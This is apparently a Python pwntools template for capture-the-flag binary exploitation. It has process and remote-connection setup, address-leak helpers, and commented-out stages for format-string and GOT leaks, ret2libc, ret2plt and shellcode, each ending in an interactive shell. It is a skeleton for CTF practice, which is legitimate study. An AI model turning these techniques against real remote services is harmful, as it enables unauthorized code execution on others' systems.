#!/usr/bin/env python3
"""
Pwntools Universal Template — CTF Toolkit
Use as starting point for any binary exploit.
Edit the sections marked with # TODO

Usage: python3 pwn_template.py [--remote HOST PORT] [--debug]
"""
from pwn import *
import argparse, sys

# ─── TARGET ───────────────────────────────────────────────────────────────────
BINARY   = "./challenge"          # TODO: path to binary
LIBC     = "./libc.so.6"          # TODO: path to libc (leave empty if unknown)
LD       = "./ld-linux-x86-64.so" # TODO: linker (leave empty)

# ─── SETUP ────────────────────────────────────────────────────────────────────
context.binary = BINARY
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False) if LIBC and os.path.exists(LIBC) else None
rop  = ROP(elf)


def get_process(args):
    if args.remote:
        host, port = args.remote
        io = remote(host, int(port))
    else:
        if LD and os.path.exists(LD):
            io = process([LD, BINARY], env={"LD_PRELOAD": LIBC} if LIBC else {})
        else:
            io = process(BINARY)
        if args.debug:
            gdb.attach(io, gdbscript=GDB_SCRIPT)
    return io


GDB_SCRIPT = """
set follow-fork-mode child
b main
c
"""

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def send_payload(io, payload: bytes, wait_for: bytes = b""):
    if wait_for:
        io.recvuntil(wait_for)
    io.send(payload)


def leak_addr(io, before: bytes, after: bytes = b"\n") -> int:
    io.recvuntil(before)
    raw = io.recvuntil(after, drop=True)
    addr = u64(raw.ljust(8, b"\x00"))
    log.info(f"Leaked: {hex(addr)}")
    return addr


# ─── PATTERN HELPERS ──────────────────────────────────────────────────────────

def find_offset(binary: str = BINARY) -> int:
    """Run cyclic pattern to find overflow offset — manual step."""
    pattern = cyclic(256)
    log.info(f"Cyclic pattern (256): {pattern[:40]}...")
    log.info("Run with this pattern, get EIP/RIP from crash, then:")
    log.info("  python3 -c \"from pwn import *; print(cyclic_find(0x<crash_val>))\"")
    return 0


# ─── EXPLOIT ──────────────────────────────────────────────────────────────────

def exploit(io):
    # ── Stage 1: Leak ─────────────────────────────────────────────────────────
    # TODO: modify to match the challenge

    # Example: PLT/GOT leak to defeat ASLR
    # rop.call('puts', [elf.got['puts']])
    # rop.call(elf.symbols['main'])
    # payload = flat({OFFSET: [rop.chain()]})  # TODO: set OFFSET

    # Example: format string leak
    # io.recvuntil(b"Input: ")
    # io.sendline(b"%7$p")  # TODO: find correct offset
    # leak = int(io.recvline().strip(), 16)
    # libc.address = leak - libc.symbols['__libc_start_main'] - 243

    # ── Stage 2: Shell ────────────────────────────────────────────────────────
    # Option A: ret2libc
    # binsh    = next(libc.search(b"/bin/sh\x00"))
    # system   = libc.symbols['system']
    # ret_gadget = rop.find_gadget(['ret'])[0]
    # payload = flat({OFFSET: [ret_gadget, rop.rdi.address, binsh, system]})

    # Option B: ret2plt (no libc needed if plt has useful funcs)
    # payload = flat({OFFSET: [elf.plt['system'], 0xdeadbeef,
    #                          next(elf.search(b'/bin/sh\x00'))]})

    # Option C: shellcode (needs rwx / no NX)
    # shellcode = asm(shellcraft.sh())
    # payload = shellcode + b"A" * (OFFSET - len(shellcode)) + p64(buf_addr)

    # ── Interactive ───────────────────────────────────────────────────────────
    io.interactive()


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    parser.add_argument("--debug",  action="store_true")
    args = parser.parse_args()

    io = get_process(args)
    exploit(io)


if __name__ == "__main__":
    main()
